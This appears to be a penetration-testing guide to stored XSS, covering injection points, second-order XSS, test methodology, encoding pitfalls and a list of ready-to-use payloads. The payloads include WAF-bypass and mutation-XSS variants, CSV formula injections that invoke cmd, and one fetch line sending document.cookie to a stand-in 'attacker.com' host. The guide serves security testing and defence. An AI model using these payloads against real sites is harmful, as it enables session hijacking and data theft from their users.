# 06 - Stored XSS Attack Vectors

## Overview

Stored (persistent) XSS occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. Unlike reflected XSS, stored XSS payloads persist on the server -- in databases, file systems, or caches -- and execute every time a user loads the affected page. This makes stored XSS significantly more dangerous: a single injection can compromise every visitor to a page.

**References:**
- https://portswigger.net/web-security/cross-site-scripting/stored
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

## 1. Common Injection Points

### 1.1 User Profile Fields

User profiles are one of the highest-value stored XSS targets because profile data is rendered across many pages (comments, leaderboards, member lists, admin dashboards).

| Field | Why It Works | Rendering Context |
|-------|-------------|-------------------|
| Display Name / Username | Rendered in comments, posts, mentions, admin user lists | HTML, sometimes attribute |
| Bio / About Me | Often supports rich text or markdown; large input length | HTML body |
| Avatar URL | Injected into `src` or `onerror` attributes of `<img>` tags | HTML attribute |
| Location / Website | Rendered as link text or in `<a href="">` | Attribute + HTML |
| Custom Status | Rendered in sidebars, chat, notifications | HTML body |
| Email Address | Displayed in admin panels, exported to CSV/reports | HTML body, CSV formula |

**Testing approach:**
```
# Inject into every profile field systematically
Display Name: <img src=x onerror=alert(document.domain)>
Bio: <svg/onload=alert('XSS')>
Website: javascript:alert(document.cookie)
Location: "><script>alert(1)</script>
Avatar URL: x" onerror="alert(1)
```

### 1.2 Comments, Forums, and Posts

Comment systems are the classic stored XSS vector. Rich-text editors, markdown parsers, and BBCode interpreters all present injection opportunities.

**Common weak points:**
- WYSIWYG editors that allow HTML source editing
- Markdown renderers that pass raw HTML through (e.g., `<script>` inside markdown)
- BBCode parsers with incomplete sanitization (e.g., `[url]javascript:alert(1)[/url]`)
- Nested formatting abuse: `[b]<script>alert(1)</script>[/b]`

### 1.3 Messaging and Chat Systems

Private messages, direct messages, and group chats often have weaker sanitization than public-facing content because developers assume only the recipient sees the content.

**Key vectors:**
- Message body with inline HTML
- Message subject/title fields
- Attachment filename display
- Link preview generation (SSRF + XSS chain)
- Emoji/reaction custom name fields

### 1.4 File Names and Metadata

When applications display uploaded file names in management interfaces, directory listings, or download pages:

```
# Upload a file with an XSS filename
filename: "><img src=x onerror=alert(1)>.png
filename: <svg onload=alert(1)>.svg
```

### 1.5 Form Labels and Custom Fields

Applications that allow users to create custom forms, surveys, or fields are vulnerable when the label/title is rendered without encoding:

```
Field Label: <img src=x onerror=alert(document.cookie)>
Placeholder: "><script>alert(1)</script>
Help Text: <details open ontoggle=alert(1)>
```

### 1.6 Search History and Saved Queries

Some applications persist search terms and display them in "Recent Searches" or "Saved Filters" features. If search terms are stored and later rendered without encoding, stored XSS results.

### 1.7 Notifications and Activity Feeds

Notification systems aggregate user-generated content (usernames, post titles, file names) and render them in notification dropdowns or email digests. If any of those fields contain XSS and the notification renderer does not re-encode, the payload fires.

### 1.8 API Responses Rendered in UI

Modern SPAs fetch JSON from APIs and inject values into the DOM. If the API stores user-controlled data and the frontend uses innerHTML or v-html instead of text interpolation:

```javascript
// Vulnerable pattern
document.getElementById('username').innerHTML = apiResponse.user.displayName;

// Safe pattern
document.getElementById('username').textContent = apiResponse.user.displayName;
```

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

---

## 2. Second-Order XSS

Second-order (or higher-order) XSS occurs when the input is stored in one context but rendered in a completely different context, often at a different time and to a different user. This makes it particularly dangerous because the attacker never sees the payload execute.

### 2.1 Admin Panel Rendering

Data submitted by regular users (registrations, support requests, form submissions) is viewed by administrators in back-office panels. If the admin panel does not properly encode this data, XSS fires in the admin's session.

**Real-world example (CVE pattern):** GestSup prior to v3.2.60 stored HTML/JavaScript in API error logs. When administrators viewed the logs through the web interface, injected content rendered without output encoding, executing arbitrary scripts in the administrator's browser session.

**Reference:** https://nvd.nist.gov/vuln/detail/CVE-2024-29184

### 2.2 Log File Viewers

Web-based log viewers that render log entries in HTML are vulnerable when log data contains user-controlled values:

```
# Inject via fields that get logged
Username at login: <script>alert('XSS')</script>
User-Agent header: <img src=x onerror=alert(1)>
URL path: /page/<svg/onload=alert(1)>
```

**Reference:** https://owasp.org/www-community/attacks/Log_Injection

### 2.3 Export Functionality (CSV/PDF/HTML)

When applications export user data to CSV, HTML reports, or PDF, injected payloads can execute:

- **CSV injection:** Cells starting with `=`, `+`, `-`, or `@` are parsed as formulas by spreadsheet software
- **HTML export:** Raw HTML in exported data renders in the browser
- **PDF generation:** HTML-to-PDF converters may execute embedded JavaScript

```
# CSV injection payload
=cmd|'/C calc'!A0
+cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
-2+3+cmd|'/C calc'!A0
```

**Reference:** https://owasp.org/www-community/attacks/CSV_Injection

### 2.4 Email Notifications

If user-controlled data (usernames, message content, file names) is included in HTML email templates without encoding:

```
# Register with XSS in display name
Display Name: <img src=x onerror=alert(1)>

# When the app sends "New message from <display_name>",
# the payload fires in the recipient's email client (if it renders HTML)
```

---

## 3. Testing Methodology for Stored XSS

### 3.1 Input/Output Mapping

**Step 1: Enumerate all input points**
- Profile fields, comments, messages, file uploads, form builders, API endpoints, settings

**Step 2: Trace each input to its output locations**
- Where does each stored value get rendered? Map input -> storage -> all rendering contexts
- A single input field may render in 5+ different locations with different encoding

**Step 3: Test context-specific payloads**
```
# HTML body context
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

# HTML attribute context (breaking out of quoted attribute)
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "

# JavaScript string context
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

# URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 3.2 Persistence and Scope Testing

1. **Verify persistence:** Submit payload, log out, log in as different user, check if payload executes
2. **Test scope:** Does the payload fire for the submitter only, or for all users who view the page?
3. **Check caching:** Is the payload cached by CDN or application cache? This amplifies impact
4. **Test encoding round-trips:** Submit encoded payloads, verify if double-encoding or decode-then-re-encode introduces vulnerabilities

### 3.3 Automated Discovery

```bash
# Use paramspider or similar to find all parameters
# Then fuzz each parameter with stored XSS payloads
# Monitor with blind XSS callback to catch second-order execution
```

---

## 4. Database-Level Persistence and Encoding

### 4.1 Character Set Issues

- **UTF-8 vs Latin-1 mismatch:** Database stores in Latin-1, application reads as UTF-8. Multibyte characters can break out of encoding
- **Truncation attacks:** If the database column is VARCHAR(255) and the input is longer, truncation may cut off closing tags or sanitization markers
- **NULL byte injection:** `%00` can terminate strings in some languages, bypassing length checks

### 4.2 Encoding at Storage vs Rendering

| Strategy | Risk |
|----------|------|
| Encode on input, store encoded | Risk of double-encoding on output |
| Store raw, encode on output | Correct approach but must encode in EVERY rendering context |
| Store raw, no encoding | Vulnerable |

**Best practice:** Store data raw and encode at the point of rendering, using context-appropriate encoding (HTML entity encoding for HTML body, JavaScript encoding for JS context, URL encoding for URL context).

### 4.3 ORM and Framework Behavior

```python
# Django - auto-escapes in templates (safe by default)
{{ user.display_name }}           # Escaped - safe
{{ user.display_name|safe }}      # DANGEROUS - marks as safe HTML
{% autoescape off %}              # DANGEROUS - disables escaping
```

```javascript
// React - safe by default
<div>{user.displayName}</div>           // Escaped - safe
<div dangerouslySetInnerHTML={{__html: user.displayName}} />  // DANGEROUS
```

---

## 5. Ready-to-Use Stored XSS Payloads

### Basic Stored XSS Payloads

```html
<!-- 1. Classic script tag -->
<script>alert(document.domain)</script>

<!-- 2. Image onerror -->
<img src=x onerror=alert(document.domain)>

<!-- 3. SVG onload -->
<svg/onload=alert(document.domain)>

<!-- 4. Details/summary ontoggle -->
<details open ontoggle=alert(document.domain)>

<!-- 5. Body onload (if injecting into full page context) -->
<body onload=alert(document.domain)>

<!-- 6. Input autofocus -->
<input onfocus=alert(document.domain) autofocus>

<!-- 7. Marquee (legacy but still works) -->
<marquee onstart=alert(document.domain)>

<!-- 8. Video with source error -->
<video><source onerror=alert(document.domain)>
```

### WAF Bypass Stored XSS Payloads

```html
<!-- 9. Case variation -->
<ScRiPt>alert(document.domain)</ScRiPt>

<!-- 10. Event handler with encoding -->
<img src=x onerror="&#97;lert(1)">

<!-- 11. SVG with nested handler -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- 12. Using String.fromCharCode -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- 13. Template literal (JS context) -->
${alert(document.domain)}

<!-- 14. Constructor-based execution -->
<img src=x onerror="window['al'+'ert'](1)">

<!-- 15. Fetch-based data exfiltration (silent payload) -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- 16. Base64 encoded payload in iframe -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">

<!-- 17. Mutation XSS (mXSS) via DOMPurify bypass patterns -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=alert(1)&gt;">

<!-- 18. Double-encoding for apps that decode twice -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://github.com/gprime31/WAF-bypass-xss-payloads
- https://www.gabriel.urdhr.fr/2024/11/20/xss-bypass/

---

## 6. Testing Decision Logic

```
FOR each input field in the application:
    1. Submit unique canary string (e.g., xss_canary_<fieldname>_<random>)
    2. Search entire application for canary rendering locations
    3. For each rendering location:
        a. Identify rendering context (HTML body, attribute, JS, URL)
        b. Check if encoding/sanitization is applied
        c. If no encoding: inject context-appropriate payload
        d. If encoding present: attempt bypass (double-encode, alternate syntax, mXSS)
    4. Verify payload persistence across sessions
    5. Check if payload fires for other users (cross-user impact)
    6. Document: input point, storage location, output context, payload, impact
```

---

## 7. Impact Amplification

Once stored XSS is confirmed, the impact extends far beyond alert(1):

- **Session hijacking:** Steal cookies/tokens of every user who views the page
- **Credential theft:** Inject fake login forms overlaying the real page
- **Worm propagation:** Self-replicating XSS (Samy worm pattern) that spreads via user interactions
- **Keylogging:** Capture all keystrokes on the page
- **Cryptocurrency mining:** Inject mining scripts for persistent resource theft
- **Defacement:** Modify page content for all visitors
- **Phishing:** Redirect users to attacker-controlled lookalike pages

**Reference:** https://cyberxsociety.com/xss-attacks-from-basics-to-advanced-post-exploitation-2025-edition/
